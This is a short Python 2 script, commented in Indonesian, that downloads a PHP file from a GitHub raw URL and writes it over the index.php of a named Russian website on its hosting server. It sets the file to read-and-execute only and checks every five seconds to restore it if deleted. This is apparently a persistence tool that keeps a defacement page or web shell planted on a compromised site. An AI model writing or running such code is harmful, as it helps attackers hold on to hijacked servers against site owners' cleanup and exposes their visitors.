import os
import time
import urllib

#  =======================================================================================
file_path = '/var/www/u0453969/data/www/autoprogress-m.ru/index.php'

#  ======================================================================================
src_url = 'https://raw.githubusercontent.com/xxTYPOxx/index/refs/heads/main/autoprogress-m.ruwi.php'

def fetch_file(url, destination):
    """
    Mengunduh file dari URL dan menyimpannya di lokasi yang ditentukan.
    Mengubah izin file menjadi 555 (read and execute).
    """
    try:
        # =================================================================================
        urllib.urlretrieve(url, destination)
        # 
        os.chmod(destination, 0555)  # Gantilah 0o555 dengan 0555 untuk Python 2
    except Exception as e:
        #  =================================================================================
        print "Error fetching file: {}".format(e)  # Menggunakan print tanpa tanda kurung

#  =========================================================================================
if not os.path.exists(file_path):
    fetch_file(src_url, file_path)

#  =========================================================================================
while True:
    time.sleep(5)  # 
    if not os.path.exists(file_path):
        fetch_file(src_url, file_path)  # ==================================================

        #python --version
        #python3 --version
        #python2 fetch_file.py
